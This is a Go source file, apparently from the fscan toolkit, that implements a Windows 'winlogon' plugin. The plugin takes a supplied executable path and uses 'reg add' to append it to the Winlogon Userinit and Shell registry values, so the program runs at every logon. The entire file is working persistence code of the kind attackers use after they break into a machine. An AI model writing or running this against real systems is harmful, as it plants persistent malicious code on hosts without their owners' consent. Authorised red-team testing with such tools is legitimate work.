//go:build (plugin_winlogon || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

type WinLogonPlugin struct {
	plugins.BasePlugin
}

func NewWinLogonPlugin() *WinLogonPlugin {
	return &WinLogonPlugin{BasePlugin: plugins.NewBasePlugin("winlogon")}
}

func (p *WinLogonPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	pePath := session.Config.WinPEFile
	if pePath == "" {
		return &plugins.Result{Success: false, Error: fmt.Errorf("%s", i18n.GetText("local_pe_not_specified"))}
	}
	if _, err := os.Stat(pePath); err != nil {
		return &plugins.Result{Success: false, Error: fmt.Errorf("%s", i18n.Tr("local_pe_not_found", pePath))}
	}

	absPath, _ := filepath.Abs(pePath)
	key := `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

	entries := []struct {
		name  string
		value string
		desc  string
	}{
		{"Userinit", fmt.Sprintf(`C:\Windows\system32\userinit.exe,%s`, absPath), i18n.GetText("winlogon_userinit_append")},
		{"Shell", fmt.Sprintf(`explorer.exe,%s`, absPath), i18n.GetText("winlogon_shell_append")},
	}

	var output strings.Builder
	var successCount int

	for _, e := range entries {
		out, err := exec.Command("reg", "add", key, "/v", e.name, "/t", "REG_SZ", "/d", e.value, "/f").CombinedOutput()
		if err != nil {
			output.WriteString(i18n.Tr("local_step_failed", e.desc, strings.TrimSpace(string(out))) + "\n")
			continue
		}
		output.WriteString(i18n.Tr("local_step_success", e.desc) + "\n")
		successCount++
	}

	if successCount > 0 {
		common.LogSuccess(i18n.Tr("winlogon_success", successCount))
	}

	return &plugins.Result{
		Success: successCount > 0,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
	}
}

func init() {
	RegisterLocalPlugin("winlogon", func() Plugin {
		return NewWinLogonPlugin()
	})
}
